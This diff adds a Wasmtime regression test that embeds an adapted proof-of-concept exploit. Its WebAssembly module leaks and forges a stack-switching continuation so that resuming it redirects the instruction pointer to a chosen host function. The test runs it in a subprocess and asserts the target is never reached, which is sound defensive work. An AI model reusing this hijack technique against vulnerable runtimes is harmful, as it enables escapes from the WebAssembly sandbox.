@@ -1557,3 +1557,220 @@ fn corruption_of_callthread_state_when_host_function_is_called_on_continuation()
     assert_eq!(result, 1);
     Ok(())
 }
+
+// PoC adapted from https://github.com/bytecodealliance/wasmtime/issues/13028
+mod continuation_arbitrary_rip_poc {
+    use std::env;
+    use std::process::Command;
+    use wasmtime::*;
+
+    const CHILD_ENV: &str = "WASMTIME_CONTINUATION_ARBITRARY_RIP_CHILD";
+    const CHILD_TEST: &str = concat!(
+        "stack_switching::continuation_arbitrary_rip_poc::",
+        "trapping_continuation_does_not_leak_token"
+    );
+    const RBP_FILL: i64 = 0x1337_1337_1337_1337;
+    const CHOSEN_EXIT_CODE: i32 = 213;
+    const TARGET_MARKER: &[u8] = b"chosen_rip_target_hit\n";
+
+    #[inline(never)]
+    extern "C" fn chosen_rip_target() -> ! {
+        unsafe {
+            let _ = libc::write(
+                libc::STDERR_FILENO,
+                TARGET_MARKER.as_ptr().cast(),
+                TARGET_MARKER.len(),
+            );
+            libc::_exit(CHOSEN_EXIT_CODE);
+        }
+    }
+
+    fn configured_engine() -> Result<Engine> {
+        let mut config = Config::new();
+        config.strategy(Strategy::Cranelift);
+        config
+            .wasm_gc(true)
+            .wasm_simd(true)
+            .wasm_function_references(true)
+            .wasm_exceptions(true)
+            .wasm_stack_switching(true);
+        Engine::new(&config)
+    }
+
+    fn module_text(chosen_rip: i64) -> String {
+        format!(
+            r#"
+        (module
+          (type $victim-ft (func (result i32)))
+          (type $victim-ct (cont $victim-ft))
+
+          (type $leak-ft-start (func (param (ref null $victim-ct)) (result i64)))
+          (type $leak-ft-suspended (func (result i64)))
+          (type $leak-ct-start (cont $leak-ft-start))
+          (type $leak-ct-suspended (cont $leak-ft-suspended))
+
+          (type $wide-ft-start (func (param i64 i64 v128) (result i32)))
+          (type $wide-ft-bound (func (result i32)))
+          (type $wide-ct-start (cont $wide-ft-start))
+          (type $wide-ct-bound (cont $wide-ft-bound))
+
+          (type $reinj-ft-start (func (param i64) (result (ref null $wide-ct-start))))
+          (type $reinj-ft-suspended (func (result (ref null $wide-ct-start))))
+          (type $reinj-ct-start (cont $reinj-ft-start))
+          (type $reinj-ct-suspended (cont $reinj-ft-suspended))
+
+          (type $tag-ft (func))
+          (tag $t (type $tag-ft))
+
+          (global $g (mut (ref null $wide-ct-bound)) (ref.null $wide-ct-bound))
+
+          (func $victim (type $victim-ft) (result i32)
+            i32.const 305419896
+          )
+
+          (func $trapper_leak (type $leak-ft-start)
+                (param (ref null $victim-ct)) (result i64)
+            unreachable
+          )
+
+          (func $trapper_reinj (type $reinj-ft-start)
+                (param i64) (result (ref null $wide-ct-start))
+            unreachable
+          )
+
+          (elem declare func $victim $trapper_leak $trapper_reinj)
+
+          (func (export "leak_token") (result i64)
+            (local $victim_cont (ref null $victim-ct))
+            (local $leaker (ref null $leak-ct-start))
+
+            (local.set $victim_cont (cont.new $victim-ct (ref.func $victim)))
+            (local.set $leaker (cont.new $leak-ct-start (ref.func $trapper_leak)))
+
+            (block $h (result (ref null $leak-ct-suspended))
+              (resume $leak-ct-start
+                (on $t $h)
+                (local.get $victim_cont)
+                (local.get $leaker))
+              return
+              (ref.null $leak-ct-suspended)
+            )
+
+            drop
+            i64.const -1
+          )
+
+          (func (export "bind_overflow_into_global") (param i64)
+            (local $reinj (ref null $reinj-ct-start))
+            (local $forged (ref null $wide-ct-start))
+            (local $bound (ref null $wide-ct-bound))
+
+            (local.set $reinj (cont.new $reinj-ct-start (ref.func $trapper_reinj)))
+
+            (block $h0 (result (ref null $reinj-ct-suspended))
+              (local.set $forged
+                (resume $reinj-ct-start
+                  (on $t $h0)
+                  (local.get 0)
+                  (local.get $reinj)))
+
+              (local.set $bound
+                (cont.bind $wide-ct-start $wide-ct-bound
+                  (i64.const 0x1111111111111111)
+                  (i64.const 0x2222222222222222)
+                  (v128.const i64x2 {RBP_FILL} {chosen_rip})
+                  (local.get $forged)))
+              (global.set $g (local.get $bound))
+              return
+              (ref.null $reinj-ct-suspended)
+            )
+
+            drop
+          )
+
+          (func (export "resume_bound") (result i32)
+            (block $h1 (result (ref null $wide-ct-bound))
+              (resume $wide-ct-bound
+                (on $t $h1)
+                (global.get $g))
+              return
+              (ref.null $wide-ct-bound)
+            )
+            drop
+            i32.const -1
+          )
+        )
+        "#
+        )
+    }
+
+    fn child_case() -> Result<()> {
+        let chosen_rip = i64::try_from(chosen_rip_target as *const () as usize)
+            .expect("function address fits in i64");
+        let engine = configured_engine()?;
+        let module = Module::new(&engine, module_text(chosen_rip))?;
+        let mut store = Store::new(&engine, ());
+        let instance = Instance::new(&mut store, &module, &[])?;
+        let leak_token = instance.get_typed_func::<(), i64>(&mut store, "leak_token")?;
+        let bind = instance.get_typed_func::<i64, ()>(&mut store, "bind_overflow_into_global")?;
+        let resume_bound = instance.get_typed_func::<(), i32>(&mut store, "resume_bound")?;
+
+        let token = match leak_token.call(&mut store, ()) {
+            Ok(token) => token,
+            Err(error) => {
+                let error = format!("{error:#}");
+                assert!(
+                    error.contains("wasm trap: wasm `unreachable` instruction executed"),
+                    "unexpected error from trapping continuation: {error}"
+                );
+                return Ok(());
+            }
+        };
+
+        // Reaching this point means that the trap leaked stale continuation
+        // state as a result. Keep exercising the original proof of concept in
+        // the subprocess so that a regression cannot corrupt the test runner.
+        assert_ne!(token, 0, "expected non-null continuation token");
+        bind.call(&mut store, token)?;
+
+        let result = resume_bound.call(&mut store, ())?;
+        panic!("unexpectedly returned from overwritten control context with {result:#x}");
+    }
+
+    #[test]
+    fn trapping_continuation_does_not_leak_token() -> Result<()> {
+        if env::var_os(CHILD_ENV).is_some() {
+            return child_case();
+        }
+
+        let output = Command::new(env::current_exe()?)
+            .env(CHILD_ENV, "1")
+            .arg("--exact")
+            .arg(CHILD_TEST)
+            .arg("--nocapture")
+            .output()?;
+
+        let marker_hits = output
+            .stderr
+            .windows(TARGET_MARKER.len())
+            .filter(|window| *window == TARGET_MARKER)
+            .count();
+
+        if !output.status.success() {
+            panic!(
+                "unexpected child status: {:?}\nstdout:\n{}\nstderr:\n{}",
+                output.status,
+                String::from_utf8_lossy(&output.stdout),
+                String::from_utf8_lossy(&output.stderr)
+            );
+        }
+
+        assert_eq!(
+            marker_hits,
+            0,
+            "the trapping continuation reached the chosen RIP target; stderr was:\n{}",
+            String::from_utf8_lossy(&output.stderr)
+        );
+        Ok(())
+    }
+}
